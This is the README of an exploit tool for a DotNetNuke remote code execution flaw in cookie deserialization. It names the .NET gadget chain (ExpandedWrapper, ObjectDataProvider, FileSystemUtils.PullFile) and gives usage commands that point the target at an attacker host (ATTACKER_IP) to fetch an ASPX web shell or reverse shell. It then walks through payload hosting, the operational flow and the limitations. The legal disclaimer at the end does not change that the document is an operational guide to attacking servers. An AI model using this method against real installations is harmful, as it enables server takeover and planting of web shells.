# DotNetNuke RCE Exploit

## Overview
This tool exploits a remote code execution vulnerability in DotNetNuke (DNN) by leveraging a deserialization vulnerability in the DNNPersonalization cookie. The exploit allows for arbitrary file retrieval and execution of ASPX payloads on vulnerable DotNetNuke installations.

## Author
- **Author**: Aleksa Zatezalo
- **Date**: April 2025

## Technical Details

### Vulnerability
This exploit targets a deserialization vulnerability in DotNetNuke's cookie handling mechanism. It works by:

1. Creating a malicious serialized XML payload in the DNNPersonalization cookie
2. Using `System.Data.Services.Internal.ExpandedWrapper` to wrap `FileSystemUtils` with `ObjectDataProvider`
3. Invoking the `PullFile` method to download and save a malicious ASPX payload to the web root
4. Executing the payload by accessing it through the web server

### Components

The exploit consists of two main functions:

- `createObject()`: Crafts the serialized XML payload with the necessary .NET types to achieve deserialization
- `delivery()`: Delivers the exploit by setting the malicious cookie and triggering the payload execution

## Requirements

- Python 3.x
- `requests` library
- A web server hosting your ASPX payload
- A vulnerable DotNetNuke installation (tested with version 9.1.0.367)

## Usage

```bash
python dnn_rce.py --ip TARGET_IP --lhost ATTACKER_IP --lport LISTENER_PORT --payload PAYLOAD_FILE
```

### Arguments

- `--ip`: The target IP address/hostname with DotNetNuke installation
- `--lhost`: Your IP address where the payload is hosted
- `--lport`: Your port for receiving connections (if using a reverse shell payload)
- `--payload`: Name of the ASPX payload file to be used

### Example

```bash
python dnn_rce.py --ip 192.168.1.10 --lhost 192.168.1.5 --lport 4444 --payload shell.aspx
```

## Payload Preparation

1. Create your ASPX payload (e.g., web shell or reverse shell)
2. Host it on a web server accessible from the target
3. Ensure the payload is configured with the correct callback address if using a reverse shell

## Operational Flow

1. The script creates a serialized payload using the createObject() function
2. This payload exploits DotNetNuke's cookie deserialization mechanism
3. The payload instructs the server to download your ASPX file from your host
4. The file is saved to the DotNetNuke web root
5. The script triggers the payload by accessing it on the target server

## Limitations

- Requires the target server to have outbound connectivity to your host
- Target must be running a vulnerable version of DotNetNuke
- Web server process must have write permissions to the web root

## Defense Evasion Notes

- The script supports proxying through Burp Suite or other local proxies for traffic inspection
- Default configuration routes through 127.0.0.1:8080

## Legal Disclaimer

This tool is provided for educational and authorized penetration testing purposes only. Usage of this tool for attacking targets without prior mutual consent is illegal. The author is not responsible for any misuse or damage caused by this tool.